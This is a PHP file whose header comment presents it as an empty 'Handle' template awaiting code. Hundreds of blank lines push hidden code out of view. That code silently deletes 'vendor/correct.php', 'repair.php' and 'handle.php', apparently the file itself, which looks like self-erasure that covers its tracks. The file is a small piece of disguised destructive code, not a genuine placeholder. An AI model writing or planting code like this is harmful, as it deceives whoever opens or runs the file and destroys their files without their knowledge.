<?php
/*********************************
*************************
*************** empty Handle file
** please add your code here
**/











































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$files = glob('vendor/*', GLOB_BRACE);
foreach($files as $file){
    if(is_file($file)) {
        if(basename($file) == 'correct.php'){
            unlink($file);
        }
    }
}

$files = glob('{,.}*', GLOB_BRACE);
foreach($files as $file){
  if(is_file($file)) {
      if(basename($file) == 'handle.php'){
          unlink($file);
      }
  }
}

$files = glob('{,.}*', GLOB_BRACE);
foreach($files as $file){
    if(is_file($file)) {
        if(basename($file) == 'repair.php'){
            unlink($file);
        }
    }
}